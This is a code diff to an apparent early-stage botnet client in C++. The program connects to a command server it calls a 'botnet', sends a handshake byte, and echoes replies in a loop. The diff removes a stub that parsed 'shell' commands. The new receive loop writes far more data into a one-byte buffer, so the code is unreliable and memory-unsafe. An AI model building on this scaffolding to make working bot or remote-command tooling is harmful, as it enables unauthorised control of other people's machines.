@@ -40,38 +40,28 @@ int main(int argc, char **argv) {
 
     WIN(SOCKET)NIX(int) sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-    connect(sock, (sockaddr *)&addr, sizeof(addr));
+    if (::connect(sock, (const sockaddr *)&addr, sizeof(addr))WIN( == SOCKET_ERROR)NIX( < 0)) {
+        std::cout << "connect to botnet error" << std::endl;
 
-    std::vector<char> buffer(40000);
-
-    buffer.at(0) = ESTABILISH_BYTE;
-
-    ::send(sock, buffer.data(), buffer.size(), 0);
-
-    char shell = SHELL_BYTE;
-
-    while (::recv(sock, buffer.data(), 40000, 0) > 0) {
-        if (buffer.at(0) == shell) {
-            std::string shell_buffer;
-
-            for (auto& _shell : buffer)
-                if (_shell != shell)
-                    shell_buffer.push_back(_shell);
-
-            std::cout << "command read: " << shell_buffer << std::endl;
-
-            shell_buffer = "Command recv";
-
-            std::cout << "ready: " << shell_buffer.c_str() << std::endl;
-
-            if (::send(sock, shell_buffer.c_str(), shell_buffer.size(), 0) < 0)
-                std::cout << "SEND ERROR" << std::endl;
-        }
-
-        std::cout << buffer.data() << std::endl;
-
-        for (auto& b : buffer) b = '\0';
+        return -2;
     }
 
-    return 0;
+    std::vector<char> buffer;
+
+    buffer.push_back(ESTABILISH_BYTE);
+
+    if (::send(sock, buffer.data(), buffer.size(), 0)WIN( < 0)NIX( < 0)) {
+        std::cout << "estabilish connection error" << std::endl;
+
+        return -3;
+    }
+
+    char otvet[] = "Ответ от бота";
+
+    while (::recv(sock, buffer.data(), __INT16_MAX__, 0)) {
+        std::cout << buffer.data() << std::endl;
+
+
+        ::send(sock, otvet, sizeof(otvet), 0);
+    }
 }
